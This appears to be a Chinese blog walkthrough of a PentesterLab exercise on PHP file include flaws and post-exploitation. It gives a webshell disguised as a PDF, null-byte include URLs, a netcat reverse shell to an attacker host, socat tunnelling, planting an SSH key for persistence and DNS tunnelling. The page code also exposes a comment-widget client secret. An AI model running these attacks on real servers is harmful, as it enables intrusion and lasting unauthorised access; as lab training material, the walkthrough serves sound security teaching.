<p>你需要使用一个不会被你的服务器解析成PHP文件的扩展名来保存这个文件来确保脆弱的服务器收到的是PHP代码而不是PHP代码的执行结果。例如你可以使用扩展名： <strong>.txt</strong> 。然后你可以包含文件并指定要运行的命令去访问页面：<a href="http://vulnerable/index.php?page=http://yourserver/webshell.txt&cmd=ifconfig" target="_blank" rel="noopener" title="http://vulnerable/index.php?page=http://yourserver/webshell.txt&amp;cmd=ifconfig">http://vulnerable/index.php?page=http://yourserver/webshell.txt&amp;cmd=ifconfig</a></p>
<p>如果你访问这个页面（配置允许远程文件包含），下面的步骤会发生：</p>
<ol>
<li>PHP脚本将检索文件 <strong>webshell.txt</strong> ；  </li>
<li>PHP脚本将开始解释代码；  </li>
<li>PHP脚本将使用URL中所提供的cmd的值（注：值是提供给脆弱的服务器不是你的服务器）；  </li>
<li>提供的命令将被执行；  </li>
<li>服务器将发送回命令的结果。 </li>
</ol>
<p>正如我们之前所说的，脆弱的系统是不存在远程文件包含，这种方法不会在当前的设置下工作。</p>
<h2 id="本地文件包含利用"><a href="#本地文件包含利用" class="headerlink" title="本地文件包含利用"></a>本地文件包含利用</h2><p>有很多方法可以利用一个本地文件包含，它们都是基于相同的方法：你需要找到一个办法把PHP代码放入在系统上的文件，然后包含代码。</p>
<p>可以使用下列方法：</p>
<ul>
<li>在日志中注入PHP代码：例如，一个Web服务器，通过访问的URL（路径包含PHP代码），然后包含Web服务器的日志。  </li>
<li>在一封电子邮件中注入PHP代码，通过发送电子邮件，然后包括电子邮件（在`/var/spool/mai）。  </li>
<li>上传一个文件，包含它，例如你可以上传一个图像并把你的PHP代码写在图像的注释部分（因此不会修改图像大小）。  </li>
<li>上传PHP代码通过另一个服务：FTP，NFS，…  </li>
<li>…  </li>
</ul>
<p>注入到日志应该是你最后的解决方案，如果你没有正确地使用PHP语法（正确的PHP代码和正确的HTTP编码）在第一次尝试，你将不得不等待日志替换。</p>
<p>在这里我们可以看到，该应用程序允许用户上传一个介绍为“征文”。我们将使用此功能来上传我们的PHP代码。</p>
<p>为了测试这个上传功能，我们需要检查：</p>
<ul>
<li>可以上传的文件扩展名；  </li>
<li>可以上传的内容类型。</li>
</ul>
<p>检查扩展可以很容易地通过重命名PDF文件到一个PHP文件做尝试上传。如果文件扩展名的PDF文件是可接受的，很可能是没有控制文件扩展名。</p>
<p>一些PHP开发者的信任值由HTTP协议在多部分消息，只检查值为<code>$_FILES[&#39;file&#39;][&#39;type&#39;]</code>。这个值是由客户端控制，可以使用代理服务器很容易修改。</p>
<p>对于内容类型，我们只需要工作在其他方式，我们可以创建一个txt文件，重命名为file.pdf。如果应用程序接收文件，则没有过滤内容类型。</p>
<p>在这里我们可以看到，通过之前的方法测试，扩展名和内容类型都被上传脚本检查。</p>
<p>利用这个问题，我们将需要一个有效的PDF文件包含PHP代码。</p>
<p>我们可以使用下列方法之一：</p>
<ul>
<li>采取任何PDF并且增加我们的PHP的有效载荷；  </li>
<li>创建一个PHP文件看起来像一个PDF，并将绕过内容类型检查。</li>
</ul>
<p>第一种方法可能会造成一些问题取决于文件内容（因为有些字符不能正确支持在包含中）和可能不工作。第二种方法是安全的，为什么我们要用它。</p>
<p>如果你打开一个PDF文件，你可以看到第一行看起来像：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> head -n 1 sample.pdf</span></span><br><span class="line"><span class="meta">%</span><span class="bash">PDF-1.4</span></span><br></pre></td></tr></table></figure>

<p>如果你使用函数 <strong>mime_content_type</strong> （大部分PHP开发者用它来检查文件类型），你可以看到，只有以下需要： <strong>% pdf-1.4</strong> （或不同的版本）。</p>
<p>基于这些信息，我们可以创造我们的假PDF文件：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%PDF<span class="number">-1.4</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  system($_GET[<span class="string">"cmd"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后使用PDF扩展名命名它（例如 <strong>lfi.pdf</strong> ）。如果你的PHP安装在您的系统（命令行解释器），您可以快速检查文件是否被认为是一个PDF通过使用下面的代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> mime_content_type(<span class="string">'lfi.pdf'</span>) . <span class="string">"\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后运行它：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> php content-type.php</span></span><br><span class="line">application/pdf</span><br></pre></td></tr></table></figure>

<p>我们现在有一个有效的PDF包含PHP的有效载荷。</p>
<p>一旦我们把我们的文件上传，我们需要包含它，为了得到这方面的信息，可以登录电子邮件和密码设置，看到有一个链接到我们上传的文件。</p>
<p>我们已经知道了文件被上传，我们可以包含它。然而，我们需要有一个空字节来摆脱被合法的PHP代码添加的扩展名。<br>PHP 5.3.4之后不能使用零字节的技巧摆脱扩展名做本地文件包含。<br>我们可以访问以下页面获取命令执行：<a href="http://vulnerable/index.php?page=uploads/lfi.pdf%00&cmd=uname" target="_blank" rel="noopener" title="http://vulnerable/index.php?page=uploads/lfi.pdf%00&amp;cmd=uname">http://vulnerable/index.php?page=uploads/lfi.pdf%00&amp;cmd=uname</a></p>
<p>注：</p>
<ul>
<li>page参数是我们上传的文件名，添加一个空字节；  </li>
<li>cmd是我们要运行的命令。</li>
</ul>
<p>我们可以在包含文件页面看到PDF-和命令的结果：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%PDF- Linux</span><br></pre></td></tr></table></figure>

<h1 id="Shell与反向Shell"><a href="#Shell与反向Shell" class="headerlink" title="Shell与反向Shell"></a>Shell与反向Shell</h1><h2 id="后续利用介绍"><a href="#后续利用介绍" class="headerlink" title="后续利用介绍"></a>后续利用介绍</h2><p>后续利用允许你更好的访问系统。有一个webshell是第一步，然而，对于每个命令你将需要发送一个HTTP请求并等待结果。此外，如果你试着用 <strong>cd ..</strong> 移动到父目录，你会看到下一个命令仍将运行在相同的目录：每个请求都是完全独立于前一个。</p>
<p>为了绕过这些限制，我们将需要得到一个“真正”的shell在远程操作系统上。</p>
<h2 id="Shell与反向Shell-1"><a href="#Shell与反向Shell-1" class="headerlink" title="Shell与反向Shell"></a>Shell与反向Shell</h2><p>有两种方法得到远程服务器上的shell，你可以获得命令执行：</p>
<ul>
<li>使用shell：你将绑定一个shell到一个TCP端口（step1）。然后你就可以连接它运行命令（step2）。</li>
</ul>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032603.png" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<ul>
<li>使用反向shell：你可以在你的本地系统绑定一个端口（step1），在服务器端连接到这个端口并且重定向输入和输出到一个shell。然后你就可以运行命令。</li>
</ul>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032604.png" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>在大多数系统（包括脆弱的系统），你将能够绑定一个端口（只要你选择1024的端口，因为这是一个Unix系统），但是很可能你将无法访问它（因为你和易受攻击的服务器之间的防火墙）。这就是为什么大多数的时间，绑定shell到端口不能解决问题。</p>
<p>因为防火墙更容易过滤入站流量相比于出站流量，这是更可能是一个反向shell正常工作。此外，您可以使用特权端口（如TCP／80或TCP／443）只要你在系统中有充分的权限。</p>
<p>使用反向shell连接我们需要确保netcat在双方系统都是可用的。</p>
<p>在您的本地系统，你可以很容易地安装它，因为你有充分的机会。根据你的操作系统，你将需要：</p>
<ul>
<li>从Nmap项目中安装ncat（<a href="http://nmap.org/ncat/" target="_blank" rel="noopener">http://nmap.org/ncat/</a>）如果你使用Windows。  </li>
<li>从Nmap项目中安装ncat（<a href="http://nmap.org/download.html#macosx" target="_blank" rel="noopener">http://nmap.org/download.html#macosx</a>）如果你使用Mac OS。  </li>
<li>在Fedora中安装nmap并且使用 <strong>ncat</strong> 。  </li>
<li>在Debian中安装nmap并且使用 <strong>netcat</strong> 。  </li>
</ul>
<p>有不同版本的netcat存在并且其中一些不支持 <code>-e</code>参数。确保你使用的版本支持此参数。</p>
<p>在远程服务器上已经安装有netcat。如果没有，你可以使用下面的方法：</p>
<ul>
<li>添加 <strong>%PDF-1.4</strong> 到文件第一行并且使用合法的上传脚本；  </li>
<li>使用wget从远程服务器下载。</li>
</ul>
<p>对于这两种方法，您将需要有一个版本的nc针对目标操作系统的体系结构编译（最有可能是一个静态二进制文件）。</p>
<p>对于第一种方法，如果你是一个Unix系统（Linux，Mac或*BSD），你可以：</p>
<p>添加一个PDF文件头：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"%PDF-"</span> &gt; pdfheader</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat pdfheader nc &gt; nc.pdf</span></span><br></pre></td></tr></table></figure>

<p>上传你创建的服务器文件。<br>从文件中提取二进制文件使用文件包含漏洞：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> tail -n +2 nc.pdf &gt; nc</span></span><br></pre></td></tr></table></figure>

<p>对于第二种方法，你只需要下载nc从远程服务器使用包含漏洞。</p>
<p>在被感染的系统上运行命令，我们将使用本地文件包含漏洞。我们需要遵循这些步骤：</p>
<p>在本地操作系统使用netcat绑定一个端口（nc或netcat，取决于你的系统）：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo nc -l -p 80</span></span><br></pre></td></tr></table></figure>

<p>使用我们的webshell运行netcat影响服务器通过访问以下URL：（<a href="http://vulnerable/index.php?page=uploads/lfi.pdf%00&cmd=nc%20attacker%2080%20-e%20/bin/bash" target="_blank" rel="noopener">http://vulnerable/index.php?page=uploads/lfi.pdf%00&amp;cmd=nc%20attacker%2080%20-e%20/bin/bash</a>）对应的命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nc attacker 80 -e /bin/bash</span></span><br></pre></td></tr></table></figure>

<p>attacker是你的Ip地址。</p>
<p>使用sudo（或root权限）允许我们绑定80端口，该端口不能被视为一个普通用户。端口80（HTTP）是不太可能被封锁。以下端口也可以尝试：21，53，443。</p>
<p>然后你可以运行命令（uname或id为例）在本地的nc：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo nc -l -p 80</span></span><br><span class="line">uname</span><br><span class="line">Linux</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>

<h1 id="通过socat进行TCP重定向"><a href="#通过socat进行TCP重定向" class="headerlink" title="通过socat进行TCP重定向"></a>通过socat进行TCP重定向</h1><p>我们现在有一个shell，但它会变得更好如果有一个真正的shell（比如支持Ctrl-C），可以轻松地复制和检索文件例如使用SSH。</p>
<p>要做到这一点，我们需要使用socat（<a href="http://www.dest-unreach.org/socat/" target="_blank" rel="noopener">http://www.dest-unreach.org/socat/</a>）。socat可能是日常系统管理和入侵的最有用的网络工具之一。</p>
<p>你可以找到一些Windows版本在互联网上，但它可能是更好的使用你自己编译的版本，或者你使用一个虚拟Linux系统。</p>
<p>因为这个脆弱的系统是防火墙，我们将使用一个反向连接告诉socat重定向所有流量从我们的系统到一个本地端口。</p>
<p>在这个例子中，我们将尝试访问本地SSH服务器上可用的端口22，使用重定向到我们在本地系统的2222端口。下面的图显示了两个系统之间的网络流：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032605.png" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>正如你所看到的，唯一需要的权限在攻击者的一面，允许我们使用这种技术通过低特权帐户。</p>
<p>首先，我们需要把我们的本地端口2222（我们将在之后访问）和将访问的脆弱的服务器端口（端口443来避免防火墙，因为80端口已经被使用）绑定起来：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attacker $ sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr</span><br></pre></td></tr></table></figure>

<p>443端口需要在第一个位置，因为它是脆弱的服务器将尝试连接到的端口。限制访问本地端口，不允许任何人在我们的网络访问端口443和服务器上的远程端口重定向，选项可以使用绑定范围。</p>
<p>在远程服务器上，我们需要做到以下几点：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vulnerable $ while true; do socat TCP4:attacker:443 TCP4:127.0.0.1:22 ; done</span><br></pre></td></tr></table></figure>

<p><strong>attacker</strong> 是你的IP地址。  </p>
<p>别忘了杀掉循环当你不需要重定向的时候。</p>
<p>我们可以尝试SSH到远程系统：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attacker $ ssh localhost -p 2222</span><br></pre></td></tr></table></figure>

<p>然而，我们无法连接，因为我们不知道 <strong>www-data</strong> 的密码。</p>
<p>要获得SSH访问，我们将需要设置一个远程服务器上的SSH密钥。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attacker $ ssh-keygen -P "" -f vulnerable</span><br></pre></td></tr></table></figure>

<p>注：</p>
<ul>
<li><strong>-P</strong> 表示一个空的密码；  </li>
<li><strong>-f</strong> 表示文件名。</li>
</ul>
<p>两个文件将被创建：<strong>vulnerable</strong> 和 <strong>vulnerable.pub</strong></p>
<p>我们可以使用前面上传netcat（或任意文件）的方法之一来上传公钥文件到脆弱的系统上。为此，我们需要停止socat和netcat。因为公钥文件不是二进制文件，我们只能通过一个新的netcat的shell把文件复制过去。你需要重新运行一个监听netcat在端口80（<strong>sudo ncat -l -p 80</strong>）然后你可以上传公钥文件。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">attacker $ sudo ncat -l -p 80</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">grep www-data /etc/passwd</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">mkdir ~www-data/.ssh</span><br><span class="line">echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzERqIb6v4mbrkV6xdlqsDMo/sBy3sA9SMOpBJI6DRHmy9Y6ilSlv7UGHzg9dDOhqxis/RVcGBQP2eceNOUvBY24yRD8R31p73AilUwhdvRm8XhRszaXciskSBTjLQMY9Iw8poDNZFZZqIkhWq6ZMIUdv0PfVouC0UXJBYq3AQIJLKSlJSy/DyrORUY7kLf5h3oyk1KlWGKdZ1duZeYwz7Qc2kHHw3TpsckhyS0VaeZ6V3Rk4pNVIaUxOCENP+hNDWQWpkvPKXPjvr4tYS1kzs+TVi79z76yV61KmwZDLwPse3DBUSXakCSDoPI20C2SIGWjqI7QrjtM/SQe19N8f9 attacker" &gt;&gt; ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<p>现在，一切工作正常，我们可以重新启动socat的进程。（注：重启本地socat并且重新运行在脆弱的系统上的socat命令）并且连接到之前socat创建的连接。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">attacker $ ssh localhost -p 2222 -l www-data -i vulnerable </span><br><span class="line">Linux debian 2.6.32-5-amd64 #1 SMP Thu Mar 22 17:26:33 UTC 2012 x86_64</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line"><span class="meta">$</span><span class="bash"></span></span><br></pre></td></tr></table></figure>

<p>注：</p>
<ul>
<li><strong>-p 2222</strong> 是通过SSH转发的端口；  </li>
<li><strong>-l www-data</strong> 表明我们将要使用的用户的名称（可以使用netcat的shell的命令id得到这个值）；  </li>
<li><strong>-i vulnerable</strong> 是私钥文件。</li>
</ul>
<p>一旦我们有了SSH访问远程服务器，现在我们可以很容易地使用SSH进行端口重定向，例如访问本地MySQL服务器。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attacker $ ssh localhost -p 2222 -l www-data -i vulnerable -L 13306:localhost:3306</span><br></pre></td></tr></table></figure>

<p>然后你可以检查您使用SSH重定向访问的MySQL（在您的本地系统）：<br>MySQL客户端：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attacker $ mysql -h localhost -u root -P 13306</span><br></pre></td></tr></table></figure>

<p>telnet去看MySQL服务端的banner：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attacker $ telnet localhost 13306</span><br></pre></td></tr></table></figure>

<p>SSH允许我们使用其他工具如sshfs挂载影响服务器的文件系统，或使用这个服务器作为socks代理访问其他内部服务器（使用 ssh -D）或运行X11应用。</p>
<h1 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h1><p>不幸的是，一个简单的虚拟系统不提供我们的架构设置这种喷出方法，但最好要知道它能做的这些。</p>
<p>当入站和出站流量完全过滤，你仍然可以使用DNS隧道（如果DNS请求“互联网”是允许的）。可以使用的工具 <strong>dns2tcp</strong> 。</p>
<p>下面的图表说明了DNS隧道工作情况：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015032606.png" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>让我们说，客户想发送字符串AAAA到服务器，它将发送一个DNS请求到 <strong>aaaa.pentesterlab.com</strong> ，此DNS请求将被转发到客户端的DNS服务器和所有的服务器，直到达到DNS服务器 <strong>pentesterlab.com</strong> 。这样的字符串AAAA已通过所有的DNS服务器到服务器。然后服务器要返回字符串 <strong>BBBB</strong> 到客户端，它将使用合法的DNS响应并且信息将向客户传递后被所有DNS服务器发送请求时使用。</p>
<p>DNS隧道是绕过安全限制的最热点的一种简易方法。</p>
<p>在这里，被入侵的系统将作为dns2tcp客户端，它会发送一个请求来检索它需要运行的命令，一旦收到响应，它会运行命令并发送结果到服务器。</p>
<p>例如，让我们使用带d.pentesterlab.com作为我们的dns2tcp服务器。我们将运行以下命令：</p>
<ul>
<li>在受感染的系统上；  </li>
<li>在服务器上。</li>
</ul>

        </div>

        <blockquote class="post-copyright">
    
    <div class="content">
        
<span class="post-time">
    最終更新：<time datetime="2019-09-03T07:30:50.763Z" itemprop="dateUpdated">2019-09-03 15:30:50</time>
</span><br>


        
        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
        
    </div>
    
    <footer>
        <a href="https://darkwing.moe">
            <img src="/img/avatar.jpg" alt="暗羽">
            暗羽
        </a>
    </footer>
</blockquote>

        
<div class="page-reward">
    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
</div>



        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pentesterlab/" rel="tag">Pentesterlab</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2015/03/26/PHP-Include-And-Post-Exploitation/&title=《PHP Include And Post Exploitation》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2015/03/26/PHP-Include-And-Post-Exploitation/&title=《PHP Include And Post Exploitation》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2015/03/26/PHP-Include-And-Post-Exploitation/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《PHP Include And Post Exploitation》 — 喵喵喵喵&url=https://darkwing.moe/2015/03/26/PHP-Include-And-Post-Exploitation/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2015/03/26/PHP-Include-And-Post-Exploitation/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2015/04/09/From-SQL-Injection-to-Shell-PostgreSQL-edition/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">From SQL Injection to Shell: PostgreSQL edition</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2015/03/20/From-SQL-Injection-to-Shell-II/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">From SQL Injection to Shell II</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'd35074a248599729ad26',
          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
          repo: 'BlogComments',
          owner: 'zjicmDarkWing',
          admin: ['zjicmDarkWing'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>

<div id="reward" class="page-modal reward-lay">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <h3 class="reward-title">
        <i class="icon icon-quote-left"></i>
        谢谢大爷~
        <i class="icon icon-quote-right"></i>
    </h3>
    <div class="reward-content">
        
        <div class="reward-code">
            <img id="rewardCode" src="/img/wechat.png" alt="打赏二维码">
        </div>
        
        <label class="reward-toggle">
            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
                data-wechat="/img/wechat.png" data-alipay="/img/alipay.jpeg">
            <div class="reward-toggle-ctrol">
                <span class="reward-toggle-item wechat">微信</span>
                <span class="reward-toggle-label"></span>
                <span class="reward-toggle-item alipay">支付宝</span>
            </div>
        </label>
        
    </div>
</div>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>このブログの内容物は<a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.ja" target="_blank">クリエイティブ・コモンズ 表示 - 非営利 - 継承 4.0 国際ライセンスの下に提供されています</a></span>
        </p>
    </div>
    <div class="bottom">
        <p><span>暗羽 &copy; 2014 - 2022</span>
            <span>
                
                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2015/03/26/PHP-Include-And-Post-Exploitation/&title=《PHP Include And Post Exploitation》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2015/03/26/PHP-Include-And-Post-Exploitation/&title=《PHP Include And Post Exploitation》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2015/03/26/PHP-Include-And-Post-Exploitation/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《PHP Include And Post Exploitation》 — 喵喵喵喵&url=https://darkwing.moe/2015/03/26/PHP-Include-And-Post-Exploitation/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2015/03/26/PHP-Include-And-Post-Exploitation/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACsklEQVR42u3aQW7jQAwEwPz/015gTwssZDebGsWH0slwHGlqDhqiyZ+f+Hr9vf7/fPXLf6+r/3pdXMkabr7w8PDwqqW/f1i36Pw30w1K1oyHh4d3mpccBh0mWXTOyNeMh4eH9w28DrYvuPOyHg8PD+87efnLffq632w3Hh4e3vO8JIzoDoBNjJuHIzdkLXh4eHgxb9MA+63PD/X38PDw8IZd9S5CnR4AeWk+Xi0eHh7eAd6+ydQ1yTYtsbyIx8PDwzvB24xGdUt//6zpSNaH7cDDw8M7wJs2k6bhadcA67YyOh7w8PDw1rzN4ze/37zo87YZHh4e3pO8DSb/a37naXA8mNLCw8PDG/K6+HW6Tck33STAOKXGw8PDW/Py8LSLaPOxgE0ofInEw8PDO8ZLCtb3i+5a/h1jHOPi4eHh3crrbt1d0y3rjpDLbcXDw8O7iZc0lpIjYRNJ5FHFtLDGw8PDO8HLe0bT4HU6QJAHIns8Hh4e3oa3ORiSErk7DKaDAoOhKzw8PLw1bxyGLgYLkqMi2eLkAMPDw8N7njctYadFc1em54cTHh4e3jnepnE1LbvzQ2La7vqQUuPh4eEd4OVLycvi/ThCfqZ9mCnDw8PDu5W3iR7y4CD5fropg6IcDw8P7wBvMwTQFcFTcBJkDCYj8PDw8Ba8LopNDoy81O7e5NEhhIeHh3eYlywr/6Zbbn63aIPw8PDwDvA2JfI+vOhi33IcAQ8PD+8m3mt4dXHq9JjpjrFy6AoPDw+v77+PX775WEDXMOuiDTw8PLxneMmDpyMCXcF9ZKQADw8P7xivK4XzwYK7/rfMifHw8PB+i